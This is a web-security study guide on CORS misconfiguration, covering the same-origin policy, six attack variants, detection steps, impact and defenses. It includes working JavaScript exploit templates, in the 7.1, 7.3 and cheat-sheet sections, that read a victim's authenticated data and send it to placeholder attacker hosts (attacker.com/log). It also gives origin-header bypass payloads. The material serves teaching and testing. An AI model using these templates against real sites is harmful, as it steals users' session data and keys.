# Cross-Origin Resource Sharing (CORS) Misconfiguration

## Table of Contents

1. [The Same-Origin Policy — Foundation](#1-the-same-origin-policy--foundation)
2. [What is CORS?](#2-what-is-cors)
3. [The Access-Control-Allow-Origin Header](#3-the-access-control-allow-origin-header)
4. [Credentialed Requests](#4-credentialed-requests)
5. [Preflight Requests](#5-preflight-requests)
6. [CORS vs CSRF — The Critical Distinction](#6-cors-vs-csrf--the-critical-distinction)
7. [Attack Types & Exploitation](#7-attack-types--exploitation)
   - 7.1 [Basic Origin Reflection](#71-basic-origin-reflection)
   - 7.2 [Origin Whitelist Parsing Errors](#72-origin-whitelist-parsing-errors)
   - 7.3 [Whitelisted Null Origin](#73-whitelisted-null-origin)
   - 7.4 [Exploiting XSS via CORS Trust Relationships](#74-exploiting-xss-via-cors-trust-relationships)
   - 7.5 [Breaking TLS via Insecure Protocol Whitelisting](#75-breaking-tls-via-insecure-protocol-whitelisting)
   - 7.6 [Intranet Pivoting via Credential-less CORS](#76-intranet-pivoting-via-credential-less-cors)
8. [Detection Methodology](#8-detection-methodology)
9. [Impact Assessment](#9-impact-assessment)
10. [Defense & Prevention](#10-defense--prevention)
11. [Quick Reference Cheat Sheet](#11-quick-reference-cheat-sheet)

---

## 1. The Same-Origin Policy — Foundation


### What is the Same-Origin Policy (SOP)?

SOP is a browser security mechanism that prevents a script running on one website from reading data belonging to a different website. An **origin** is defined by three components:

```
scheme://domain:port
  http  ://normal-website.com:80
```

All three must match exactly for two URLs to share an origin:

| URL accessed | Access permitted? | Why |
|---|---|---|
| `http://normal-website.com/example2/` | Yes | Same scheme, domain, port |
| `https://normal-website.com/example/` | No | Different scheme (and implicit port) |
| `http://en.normal-website.com/example/` | No | Different domain (subdomain counts as different) |
| `http://normal-website.com:8080/example/` | No | Different port |

### Why SOP Exists

When a browser sends a request to a domain, it automatically attaches any cookies belonging to that domain — including session cookies. Without SOP, visiting a malicious website would let that website's JavaScript silently read your Gmail inbox or Facebook messages, because your browser would attach your real session cookies to background requests the malicious page makes to those sites, and the malicious page's script would be free to read the response.

### What SOP Actually Restricts

Commonly misunderstood point: **SOP allows a domain to send cross-origin requests — it just blocks reading the response.**

```
Page loads <img src="https://other-site.com/photo.jpg">  → ALLOWED (image renders)
Page loads <script src="https://other-site.com/app.js">  → ALLOWED (script executes)
JavaScript tries to read other-site.com's response body  → BLOCKED by SOP
```

This is why CSRF works even with SOP fully intact — CSRF only needs the request to be *sent*, never needs the response to be *read*.

### SOP Exceptions (Built-In, Not Misconfigurations)

A handful of cross-origin interactions are permitted by design:

- **Writable-but-not-readable:** `location` / `location.href` on an iframe or new window — you can navigate it, but can't read where it currently is.
- **Readable-but-not-writable:** `window.length` (number of frames), `window.closed`.
- **Callable cross-domain:** `location.replace()`, and on new windows: `close()`, `blur()`, `focus()`. Also `postMessage()` on iframes/windows — the sanctioned way to pass data across origins.
- **Cookies are looser than SOP by legacy default** — cookies are often shared across all subdomains of a site even though each subdomain is technically a separate origin. The `HttpOnly` flag partially mitigates the *script-reading* risk (not the cross-subdomain sharing itself).
- **`document.domain` relaxation:** A page can voluntarily set `document.domain` to a parent domain (e.g. `marketing.example.com` and `example.com` both set `document.domain = "example.com"`) to allow mutual access — but only within the same registered/fully-qualified domain. Browsers no longer allow setting this to a bare TLD like `com`.

---

## 2. What is CORS?

CORS is a browser mechanism that provides a **controlled relaxation** of the same-origin policy. It allows a server to explicitly declare which other origins are permitted to read its responses — via a defined set of HTTP headers exchanged between browser and server.

**CORS is not a vulnerability by itself.** It exists because real applications legitimately need cross-origin access — a SaaS product calling its own API from a different subdomain, a partner site reading data from a public API, etc. The vulnerability appears when the **implementation** of that relaxation is too permissive — either through carelessness or through a parsing/logic mistake.

### The Core Mental Model

```
Browser on origin A requests a resource from origin B
        │
        ▼
Browser automatically attaches an "Origin: A" header to the request
        │
        ▼
Server on origin B decides: should A be allowed to READ this response?
        │
        ▼
Server replies with "Access-Control-Allow-Origin: <value>"
        │
        ▼
Browser compares its own origin (A) against that header value
        │
        ├── Match → JavaScript on origin A is allowed to read the response
        └── No match → browser blocks JavaScript from reading the response
              (the request was still SENT and still PROCESSED server-side —
               only the ability to READ the response is what's blocked)
```

the vulnerability is never about whether the request happens — it's entirely about whether the *attacker's script gets to read the response*.

---

## 3. The Access-Control-Allow-Origin Header

This is the header that actually grants (or denies) cross-origin reading access.

### Basic Mechanics

Request from `normal-website.com` to `robust-website.com`:
```http
GET /data HTTP/1.1
Host: robust-website.com
Origin: https://normal-website.com
```

Response:
```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://normal-website.com
```

Since the value matches the requesting origin exactly, the browser permits `normal-website.com`'s JavaScript to read this response.

### Valid Header Values

```
Access-Control-Allow-Origin: https://specific-origin.com   → single trusted origin
Access-Control-Allow-Origin: null                            → trusts the literal string "null"
Access-Control-Allow-Origin: *                               → trusts everyone
```

**Critical constraint:** No browser supports specifying multiple origins in a single header, and wildcards cannot be combined with a specific subdomain pattern:
```
Access-Control-Allow-Origin: https://*.normal-website.com   ← INVALID, not supported
```

### The Wildcard + Credentials Restriction (A Built-In Safety Rail)

By specification, the wildcard `*` **cannot be combined** with credentialed access:
```http
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
```
This combination is **forbidden** — browsers will not honor it, because it would mean "anyone on the internet may read this authenticated response," which would be catastrophic by design.

**Why this matters for understanding the vulnerability class:** Because this safe combination is blocked, applications that genuinely need both broad access *and* credentialed access are tempted to take a shortcut — **dynamically reflecting whatever Origin header the client sent** back into `Access-Control-Allow-Origin`. This technically satisfies the "must be a specific origin, not a wildcard" rule on a per-request basis, while functionally behaving exactly like an unrestricted wildcard. This single workaround is the root cause of the most common CORS vulnerability (Section 7.1).

---

## 4. Credentialed Requests

By default, cross-origin requests are sent **without** cookies, the `Authorization` header, or client certificates — even if the user has an active session with the target site.

To include credentials, the requesting page's JavaScript must explicitly opt in:
```javascript
req.withCredentials = true;
```

And the server must explicitly permit it:
```http
Access-Control-Allow-Credentials: true
```

**Both sides must agree.** If either is missing, the browser won't allow a credentialed cross-origin read — at most the attacker would see the same unauthenticated content they could have requested directly themselves, which is not interesting from an attack perspective.

This is why `Access-Control-Allow-Credentials: true` appearing in a response is the **single most important signal** that an endpoint is worth testing for CORS vulnerabilities — it tells you the server is willing to expose authenticated, session-specific data cross-origin if the origin check passes.

---

## 5. Preflight Requests

Preflighting is a safety mechanism added to CORS specifically to protect older, pre-CORS server endpoints from being silently exposed to new request types that CORS introduced (custom headers, non-standard methods).

### When a Preflight Happens

Only for "non-simple" requests — those using methods other than GET/HEAD/POST with standard headers, or POST with a body type other than form-encoded/text/multipart. For example, a `PUT` request with a custom header:

```http
OPTIONS /data HTTP/1.1
Host: some-website.com
Origin: https://normal-website.com
Access-Control-Request-Method: PUT
Access-Control-Request-Headers: Special-Request-Header
```

Server response:
```http
HTTP/1.1 204 No Content
Access-Control-Allow-Origin: https://normal-website.com
Access-Control-Allow-Methods: PUT, POST, OPTIONS
Access-Control-Allow-Headers: Special-Request-Header
Access-Control-Allow-Credentials: true
Access-Control-Max-Age: 240
```

The browser checks this response *before* sending the real request. If the method/headers aren't listed as allowed, the actual request never gets sent at all. `Access-Control-Max-Age` lets the browser cache this preflight decision so it doesn't have to repeat the round-trip on every request.

### Why This Matters for Testing

Preflight checks add a layer that can mask or complicate testing — if you're crafting a request with a custom header or non-standard method, you need to verify the preflight `OPTIONS` response actually grants what you're trying to do, or your "exploit" request will never reach the server from a real browser even if the final endpoint itself is vulnerable.

---

## 6. CORS vs CSRF — The Critical Distinction

This is the most commonly misunderstood relationship in this vulnerability class, and it shows up constantly in real assessments.

**CORS is not a CSRF defense.** These are solving two different problems:

| | CSRF Protection | CORS |
|---|---|---|
| **Question it answers** | "Should this request be allowed to happen?" | "Should the requester be allowed to read the response?" |
| **What it blocks** | The request itself (via tokens) | Reading the response (via browser-enforced header check) |
| **Bypassed by** | Plain HTML forms, simple `<img>`/`<form>` cross-origin submissions — these don't even touch CORS | N/A — has nothing to do with stopping submission |

**The critical insight:** An attacker can **always** directly forge a cross-origin request using a basic HTML form or `<img>` tag — none of that requires CORS permission at all, because the browser will send the request and the attacker doesn't need to read the response for a classic CSRF attack (e.g., "change the victim's email" doesn't require reading anything back).

**Where poorly configured CORS makes things worse, not better:** If an application relies on session cookies but has no separate CSRF token mechanism, and additionally has an overly permissive CORS policy, an attacker now gets a **bonus capability** — not just blindly firing a state-changing request, but also **reading back the response**, which often contains things like API keys, CSRF tokens, or other secrets that traditional CSRF couldn't have extracted. A poorly configured CORS policy *exacerbates* the impact of a missing CSRF defense; it doesn't replace the need for one, and its absence definitely doesn't compensate for missing CSRF protections either.

---

## 7. Attack Types & Exploitation

### 7.1 Basic Origin Reflection

**What it is:** The most common and most severe variant. The server takes whatever value the `Origin` request header contains and reflects it verbatim into `Access-Control-Allow-Origin`, combined with `Access-Control-Allow-Credentials: true`.

**Why this happens:** Maintaining a hardcoded whitelist of trusted domains is operational overhead, and developers reach for "just allow whoever's asking" as the path of least resistance — without realizing this defeats the entire purpose of the origin check.

**Vulnerable exchange:**
```http
GET /sensitive-victim-data HTTP/1.1
Host: vulnerable-website.com
Origin: https://malicious-website.com
Cookie: sessionid=...
```
```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://malicious-website.com
Access-Control-Allow-Credentials: true
```

The server is functionally saying "yes, *any* origin asking is fine" — it just dresses it up per-request to dodge the `*` + credentials restriction described in Section 3.

**Exploit payload (hosted on attacker's site):**
```html
<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://vulnerable-website.com/sensitive-victim-data',true);
req.withCredentials = true;
req.send();
function reqListener() {
    location='//malicious-website.com/log?key='+this.responseText;
};
</script>
```

**Mechanics:** The victim, while authenticated on `vulnerable-website.com`, visits the attacker's page. The script fires a credentialed XHR request to the vulnerable site — the victim's own session cookie rides along automatically. The server reflects the attacker's origin and allows credentials, so the browser permits `reqListener` to read the response body. The script then exfiltrates that data by redirecting (or beaconing) to the attacker's own log endpoint with the stolen data appended as a query parameter.

**Testing process:**
```
1. Identify an authenticated endpoint that returns sensitive data
2. Resend it in Burp Repeater with an added header: Origin: https://example.com
3. Check whether the response reflects that arbitrary origin back in
   Access-Control-Allow-Origin
4. If reflected AND Access-Control-Allow-Credentials: true is present → confirmed
```

---

### 7.2 Origin Whitelist Parsing Errors

**What it is:** The application maintains an actual whitelist (better practice than blind reflection) but implements the *matching logic* incorrectly — typically via naive substring, prefix, or suffix matching instead of exact domain parsing.

**Legitimate-looking flow:**
```http
GET /data HTTP/1.1
Host: normal-website.com
Origin: https://innocent-website.com
```
```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://innocent-website.com
```

**Suffix-matching flaw:** If the check is "does the origin end with `normal-website.com`?":
```
Allowed pattern:  *normal-website.com
Attacker registers: hackersnormal-website.com
```
This domain literally ends with the string `normal-website.com` — a naive suffix check passes it, even though it's a completely unrelated domain the attacker fully controls.

**Prefix-matching flaw:** If the check is "does the origin start with `normal-website.com`?":
```
Allowed pattern:  normal-website.com*
Attacker registers: normal-website.com.evil-user.net
```
The attacker's domain literally starts with the expected string — but the *actual* domain (the part that matters for ownership and DNS resolution) is `evil-user.net`. The trusted-looking prefix is just a subdomain label the attacker chose to include.

**Why this is dangerous beyond the obvious:** These mistakes are often introduced specifically to support legitimate subdomain access (e.g., "allow all of `*.mycompany.com`") — a reasonable business need implemented with a regex or string check that's subtly too loose at the boundary.

**Testing process:** Try registering test domains (or simulating via the `Origin` header in Burp, since the server can't verify domain ownership at the HTTP layer) that satisfy a naive substring/prefix/suffix match but aren't a genuine subdomain or related domain.

---

### 7.3 Whitelisted Null Origin

**What it is:** The application whitelists the literal string `null` as a trusted origin — usually to make local development or certain legitimate edge cases work — without realizing `null` is also something an attacker can deliberately produce.

**When browsers naturally send `Origin: null`:**
- Cross-origin redirects
- Requests originating from serialized data
- Requests using the `file://` protocol
- **Sandboxed cross-origin requests** (this is the one attackers weaponize)

**Vulnerable exchange:**
```http
GET /sensitive-victim-data
Host: vulnerable-website.com
Origin: null
```
```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
```

**Exploit — forcing a sandboxed iframe to emit `Origin: null`:**
```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,
<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','vulnerable-website.com/sensitive-victim-data',true);
req.withCredentials = true;
req.send();
function reqListener() {
    location='malicious-website.com/log?key='+this.responseText;
};
</script>"></iframe>
```

**Mechanics:** The `sandbox` attribute deliberately strips the iframe's content of a normal origin — this is a legitimate browser security feature for isolating untrusted embedded content. But that stripped-origin behavior produces exactly the `null` value the server has chosen to trust. The attacker is using a real browser security mechanism *against* the server's own flawed trust decision.

---

### 7.4 Exploiting XSS via CORS Trust Relationships

**What it is:** Even a "correctly" implemented CORS policy that whitelists a specific, legitimate subdomain still establishes a **trust relationship**. If that trusted subdomain has its own unrelated vulnerability (XSS), the CORS trust becomes a bridge for escalating that XSS into theft of data from the *parent* application.

**The CORS configuration itself looks completely reasonable:**
```http
GET /api/requestApiKey HTTP/1.1
Host: vulnerable-website.com
Origin: https://subdomain.vulnerable-website.com
Cookie: sessionid=...
```
```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://subdomain.vulnerable-website.com
Access-Control-Allow-Credentials: true
```

Trusting your own legitimate subdomain seems sensible on its face — there's no parsing bug, no reflection, no `null` whitelisting mistake here.

**The escalation:** If an attacker separately discovers a reflected or stored XSS vulnerability on `subdomain.vulnerable-website.com`, they can inject a script that runs **as if it were legitimately part of that trusted subdomain** — and that script inherits the subdomain's CORS trust relationship with the main application:

```
https://subdomain.vulnerable-website.com/?xss=<script>cors-stuff-here</script>
```

The injected script can now make the exact same authenticated cross-origin request to `vulnerable-website.com/api/requestApiKey` that any legitimate script on that subdomain could — and read back the API key — because from the main application's perspective, the request genuinely is originating from the trusted subdomain.

**Key lesson:** A CORS whitelist is only as strong as the security of every origin on that whitelist. Trusting a subdomain means inheriting *all* of that subdomain's vulnerabilities as your own attack surface.

---

### 7.5 Breaking TLS via Insecure Protocol Whitelisting

**What it is:** An application that is otherwise rigorous about HTTPS — no plain HTTP endpoints, all cookies marked `Secure` — still whitelists a *subdomain* using a plain `http://` scheme. This single inconsistency can undermine the entire TLS security model for a network-positioned attacker (e.g., on the same Wi-Fi, or anyone able to perform a MITM).

**The flawed configuration:**
```http
GET /api/requestApiKey HTTP/1.1
Host: vulnerable-website.com
Origin: http://trusted-subdomain.vulnerable-website.com
Cookie: sessionid=...
```
```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: http://trusted-subdomain.vulnerable-website.com
Access-Control-Allow-Credentials: true
```

The CORS policy explicitly trusts the **plain HTTP** version of this subdomain as a valid origin.

**Full attack chain (requires network-level interception capability):**

```
1. Victim makes ANY plain HTTP request (to anything — even an unrelated site)
        │
        ▼
2. Attacker (on-path / MITM) injects a redirect response pointing the
   victim's browser to: http://trusted-subdomain.vulnerable-website.com
        │
        ▼
3. Victim's browser follows the redirect (still plain HTTP — unencrypted)
        │
        ▼
4. Attacker intercepts THIS plain HTTP request too, and instead of
   forwarding it, returns a SPOOFED response — a page containing a
   script that fires a CORS request to https://vulnerable-website.com
   (the real, HTTPS, main application)
        │
        ▼
5. The victim's browser executes the spoofed page's script, which sends
   the legitimate cross-origin request with Origin:
   http://trusted-subdomain.vulnerable-website.com
        │
        ▼
6. The main application checks its whitelist — this origin string matches
   exactly what's permitted — and returns the sensitive data, because the
   policy never required HTTPS specifically, just a string match on the
   subdomain name regardless of scheme
        │
        ▼
7. The attacker's spoofed page (which is what actually executed in the
   victim's browser at that moment) reads the response and exfiltrates
   it to an attacker-controlled domain
```

**Why this defeats "we only use HTTPS" as a defense:** The vulnerable application never serves anything over HTTP itself — but the *Origin string* `http://trusted-subdomain...` is still considered valid by its CORS logic. The attacker never needs to compromise the real HTTPS application at all; they only need to be positioned to intercept *any* plain HTTP traffic the victim generates (which is trivial on most untrusted networks, since plenty of innocuous HTTP traffic still exists even on otherwise HTTPS-everywhere sites — ad networks, legacy redirects, captive portals, etc.).

**The deeper lesson:** CORS origin matching is a **string comparison**, not a security guarantee about how that origin's data arrived. Whitelisting any HTTP-scheme origin effectively makes the whole trust relationship only as strong as the weakest, most interceptable link in the chain — regardless of how strong the main application's own TLS posture is.

---

### 7.6 Intranet Pivoting via Credential-less CORS

**What it is:** A variant that doesn't rely on stealing cookies at all — instead, it uses the *victim's browser itself* as a network proxy to reach internal resources the attacker has no direct route to.

**The setup:** Most CORS attacks require `Access-Control-Allow-Credentials: true` to be useful, because without it, the attacker can only read *unauthenticated* content — which they could just request directly anyway, no victim needed. But there's an important exception: **when the target resource itself is only reachable from inside a private network.**

```http
GET /reader?url=doc1.pdf
Host: intranet.normal-website.com
Origin: https://normal-website.com
```
```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: *
```

No credentials header at all — and the wildcard `*` is technically "safe" by the specification's own rule (no credentials = wildcard is permitted). **But the resource being accessed is on a private intranet IP range that the attacker cannot reach directly from the public internet.**

**Why internal sites are routinely this loose:** Internal/intranet applications are frequently held to a much lower security bar than public-facing applications, on the (flawed) assumption that "only people already inside the network can reach it anyway" — without accounting for the fact that browsers belonging to people *inside* that network routinely also browse the public internet.

**The pivot:** If a victim who has access to the internal network visits an attacker-controlled external website, that victim's **browser** — not the attacker directly — is what's actually positioned to reach `intranet.normal-website.com`. The wildcard CORS policy means the external attacker page's script can fire a request to the internal address through the victim's browser, and is permitted to **read the response**, effectively turning the victim's browser into an unwitting proxy that bridges the external attacker into the internal network.

```
Attacker's external page
        │  (no credentials needed — internal resource trusts based on
        │   network position, not session state)
        ▼
Victim's browser (has network route to the intranet)
        │
        ▼
intranet.normal-website.com (otherwise unreachable to attacker directly)
        │
        ▼
Response flows back through victim's browser → attacker's script reads it
   (permitted because Access-Control-Allow-Origin: * grants read access)
```

**Key distinction from other CORS attacks in this list:** No cookie theft, no session hijacking, no XSS chain — this attack is purely about **network reachability**, using CORS's read-permission grant as the mechanism to exfiltrate data across a network boundary the attacker could never cross on their own.

---

## 8. Detection Methodology

### Step 1 — Identify Candidate Endpoints

Look specifically for endpoints that:
- Return sensitive, user-specific, or session-bound data (API keys, account details, tokens)
- Already include `Access-Control-Allow-Credentials: true` in their normal response — this is the strongest single signal worth testing

### Step 2 — Test Origin Reflection

```
1. Capture a normal authenticated request to the candidate endpoint
2. Resend in Burp Repeater with an added header: Origin: https://example.com
3. Inspect the response:
   - Access-Control-Allow-Origin reflects "https://example.com" verbatim → reflection vulnerability
   - Access-Control-Allow-Credentials: true is also present → fully exploitable
```

### Step 3 — Test Whitelist Boundary Conditions

If a fixed whitelist seems to be in place (origin is NOT simply reflected), test boundary-matching mistakes:
```
Origin: https://hackers<known-trusted-domain>          (suffix injection)
Origin: https://<known-trusted-domain>.attacker.net     (prefix injection)
```

### Step 4 — Test the Null Origin

```
1. Resend the request with: Origin: null
2. Check whether the server reflects "null" back in Access-Control-Allow-Origin
3. If yes + credentials allowed → confirmed exploitable via sandboxed iframe
```

### Step 5 — Test Scheme/Protocol Laxity

```
1. Resend with: Origin: http://<known-trusted-subdomain>  (note: http, not https)
2. If reflected/accepted despite the main app being HTTPS-only → confirms
   a TLS-undermining trust relationship exists (requires network position to exploit)
```

### Step 6 — Map Trust Relationships for XSS Pivoting

If a fixed subdomain is legitimately whitelisted (not a parsing bug), separately check that subdomain for XSS — a clean CORS config can still be a liability if the trusted origin itself isn't secure.

### Step 7 — Check Wildcard-Without-Credentials on Internal-Looking Hosts

For any internal/intranet-style hostnames encountered during testing (especially via SSRF or internal documentation), check whether their CORS policy uses `Access-Control-Allow-Origin: *` — if so, and the resource is otherwise unreachable externally, this is a viable intranet-pivot vector if you can get a victim with network access to visit a crafted page.

---

## 9. Impact Assessment

| Variant | Requires Victim Interaction | Requires Credentials Header | Typical Data Exposed |
|---|---|---|---|
| Basic origin reflection | Yes (visit malicious page) | Yes | API keys, account data, CSRF tokens |
| Whitelist parsing error | Yes (or attacker-registered domain) | Yes | Same as above |
| Null origin whitelisting | Yes (sandboxed iframe trick) | Yes | Same as above |
| XSS via trust relationship | No — pure server-side chain once XSS exists | Yes | API keys and anything the trusted relationship exposes |
| TLS-breaking insecure origin | Yes + network position (MITM) | Yes | Same as above, defeats HTTPS guarantees entirely |
| Intranet pivot (no credentials) | Yes (victim with internal network access) | No | Internal documents, internal API responses, internal service data |

### Escalation Path

```
CORS Misconfiguration Confirmed
        │
        ├── Steal API key → full API access as the victim
        │
        ├── Steal CSRF token → forge a state-changing request → account takeover
        │        (e.g. change victim's email → trigger password reset →
        │         attacker now controls the account)
        │
        ├── Chain with XSS on a trusted subdomain → bypass the need for
        │    any CORS misconfiguration of your own — inherit the trust
        │
        └── Chain with network position (MITM) → undermine an otherwise
             fully HTTPS-enforced application entirely
```

---

## 10. Defense & Prevention

### Defense 1 — Specify Exact Trusted Origins (No Dynamic Reflection)

If a resource is sensitive, hardcode the exact, specific origin(s) permitted to access it. Never derive the header value directly from the incoming `Origin` request header without validation against a real whitelist.

```
VULNERABLE: Access-Control-Allow-Origin: <reflect whatever Origin header says>
SAFE:       Access-Control-Allow-Origin: https://app.mycompany.com   (hardcoded, exact)
```

### Defense 2 — Validate Against a Strict, Exact-Match Whitelist

If multiple origins genuinely need access, validate the incoming `Origin` header against a list using **exact string equality** — never prefix, suffix, or substring matching, and never an unanchored regex.

```
VULNERABLE (suffix check):  origin.endsWith("trusted-domain.com")
VULNERABLE (prefix check):  origin.startsWith("trusted-domain.com")
SAFE:                       origin in ["https://app.trusted-domain.com",
                                        "https://api.trusted-domain.com"]
```

### Defense 3 — Never Whitelist the Null Origin

Treat `Access-Control-Allow-Origin: null` as something to actively avoid in production configuration entirely — the legitimate scenarios that produce a `null` origin (sandboxed iframes, `file://` requests, serialized data) are exactly the same techniques an attacker would deliberately reproduce.

### Defense 4 — Never Combine Wildcards with Internal Trust Assumptions

Don't rely on network topology (private IP space) as your only justification for a loose `Access-Control-Allow-Origin: *` policy. Internal browsers routinely have access to the public internet too — a wildcard on an internal resource is reachable by any external attacker who can get an internally-positioned victim to visit a malicious page.

### Defense 5 — CORS Is Not a Substitute for Server-Side Authorization

This is the most important conceptual defense: CORS only governs **browser behavior**. An attacker who wants to send a forged request doesn't need a browser at all — they can use `curl`, Burp, or any HTTP client to send a request directly to the server, completely bypassing any CORS header checks (which are enforced client-side, by the *victim's* browser, never by the server itself, and never against direct attacker-originated requests).

This means:
- Authentication and session validation must remain robust **regardless** of CORS configuration
- Sensitive state-changing actions still need **CSRF protection** (tokens, SameSite cookies) — CORS configuration changes do not provide this
- A "secure" CORS policy on an endpoint with no underlying authorization checks provides no real protection at all

### Defense 6 — Treat Trusted Origins as an Extension of Your Attack Surface

If you whitelist a subdomain or partner domain in your CORS policy, that origin's security posture becomes *your* security posture. Periodically re-verify that any origin you trust hasn't itself become vulnerable to XSS or subdomain takeover — a previously safe trust relationship can become a liability without any change to your own CORS configuration at all.

---

## 11. Quick Reference Cheat Sheet

### Detection Signal — The One Header That Matters Most

```
Access-Control-Allow-Credentials: true
```
If you see this on any response containing sensitive data, that endpoint is worth testing for CORS misconfiguration.

### Testing Payloads (Burp Repeater — Add as a Header)

```
Origin: https://example.com                          → basic reflection test
Origin: null                                          → null origin test
Origin: http://<known-subdomain>                      → insecure-scheme test
Origin: https://hackers<known-trusted-domain>          → suffix-match bypass test
Origin: https://<known-trusted-domain>.attacker.net    → prefix-match bypass test
```

### Exploit Templates

**Basic reflection / null origin exfiltration:**
```html
<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://vulnerable-website.com/sensitive-endpoint',true);
req.withCredentials = true;
req.send();
function reqListener() {
    location='https://attacker.com/log?key='+this.responseText;
};
</script>
```

**Null-origin specific (sandboxed iframe wrapper):**
```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="
<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://vulnerable-website.com/sensitive-endpoint',true);
req.withCredentials = true;
req.send();
function reqListener() {
    location='https://attacker.com/log?key='+encodeURIComponent(this.responseText);
};
</script>"></iframe>
```

### Confirmation Checklist

```
[ ] Does the endpoint return sensitive/authenticated data?
[ ] Is Access-Control-Allow-Credentials: true present?
[ ] Does Access-Control-Allow-Origin reflect an arbitrary attacker-controlled
    value verbatim?
[ ] If a fixed whitelist — does it use exact match, or naive prefix/suffix/regex?
[ ] Is "null" accepted as a trusted origin?
[ ] Are any whitelisted origins using http:// instead of https://?
[ ] Is a wildcard (*) used on an internal/intranet-only resource?
[ ] Is the endpoint reachable without credentials at all — i.e. is this
    even worth a CORS attack, or just request it directly?
```

### Decision Tree

```
Does the response include Access-Control-Allow-Credentials: true?
├── No  → check if it's a wildcard (*) AND the resource is otherwise
│         unreachable externally (intranet) → potential credential-less
│         pivot attack (Section 7.6); otherwise low value, skip
└── Yes → send Origin: https://example.com
          ├── Reflected verbatim → exploitable (Section 7.1)
          └── Not reflected → is there a real whitelist?
                ├── Yes → test prefix/suffix bypass domains (Section 7.2)
                │         test Origin: null (Section 7.3)
                │         test http:// scheme on a trusted subdomain (Section 7.5)
                └── If a SPECIFIC subdomain is legitimately trusted →
                      check that subdomain for XSS (Section 7.4)
```

### CORS vs CSRF — One-Line Reminder

```
CORS controls whether a script can READ a cross-origin response.
CSRF protection controls whether a request should be ALLOWED to happen at all.
Neither one substitutes for the other. Both can be needed on the same endpoint.
```